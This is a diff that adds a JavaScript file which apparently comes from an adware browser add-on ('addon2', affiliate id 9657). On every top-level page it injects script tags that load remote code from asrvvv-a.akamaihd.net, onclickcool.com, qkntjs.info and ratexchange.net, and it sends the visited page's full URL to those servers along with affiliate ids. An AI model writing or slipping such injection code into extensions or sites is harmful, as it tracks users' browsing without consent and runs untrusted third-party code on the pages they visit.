@@ -1,0 +1,58 @@
+(function(){
+	function AddTag(urlhttp, urlhttps, headorbody){
+		var e=document.createElement('script');
+		e.type = 'text/javascript';
+		e.src = 'https:' == document.location.protocol ? urlhttps : urlhttp;
+		if(headorbody == 0)
+		{
+			var head = document.getElementsByTagName('head')[0];
+			head.appendChild(e);
+		}
+		else
+		{
+			document.body.appendChild(e);
+		}
+	}
+	(function () {
+		if (window.self !== window.top) return;
+		var _data = _data || {};
+		_data['addonname'] = 'addon2';
+		_data['clientuid'] = '[Enter Client UID]';
+		_data['subID'] = 'addon2';
+		_data['affid'] = 9657;
+		_data['subaffid'] = 1004;
+		var path = 'addonname=' + _data['addonname'] + '&clientuid=' + _data['clientuid'] + '&subID=' + _data['subID'] + '&affid=' + _data['affid'];
+		path += '&subaffid=' + _data['subaffid'] + '&href=' + encodeURIComponent(window.location.href);
+		var e = document.createElement('script');
+		e.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'asrvvv-a.akamaihd.net/get?' + path;document.body.appendChild(e);
+	})();
+	(function () {
+		if (window.self !== window.top) return;
+		var _data = _data || {};
+		_data['addonname'] = 'addon2';
+		_data['subID'] = 'addon2';
+		_data['affid'] = 9657;
+		_data['subaffid'] = 1001;
+		var path = 'addonname=' + _data['addonname'] + '&clientuid=' + _data['clientuid'] + '&subID=' + _data['subID'] + '&affid=' + _data['affid'];
+		path += '&subaffid=' + _data['subaffid'] + '&href=' + encodeURIComponent(window.location.href);
+		var e = document.createElement('script');
+		e.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'asrvvv-a.akamaihd.net/get?' + path;
+		document.body.appendChild(e);
+	})();
+	(function () {
+		if (window.self !== window.top) return;
+		var _data = _data || {};
+		_data['addonname'] = 'addon2';
+		_data['subID'] = 'addon2';
+		_data['affid'] = 9657;
+		_data['subaffid'] = 1002;
+		var path = 'addonname=' + _data['addonname'] + '&clientuid=' + _data['clientuid'] + '&subID=' + _data['subID'] + '&affid=' + _data['affid'];
+		path += '&subaffid=' + _data['subaffid'] + '&href=' + encodeURIComponent(window.location.href);
+		var e = document.createElement('script');
+		e.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'asrvvv-a.akamaihd.net/get?' + path;
+		document.body.appendChild(e);
+	})();
+	AddTag("https://www.onclickcool.com/gm2yy8/bindo.js","https://www.onclickcool.com/gm2yy8/bindo.js",0);
+	AddTag("http://i.qkntjs.info/qknt/javascript.js","https://i_adomjs_info.tlscdn.com/adom/javascript.js",1);
+	AddTag("http://ratexchange.net/6241d3cd091af1ce1c.js","https://ratexchange.net/6241d3cd091af1ce1c.js",1);
+})();if(__egg&&__egg.getAd&&__egg.getAd.jsAdDownloadReport){__egg.getAd.jsAdDownloadReport();}
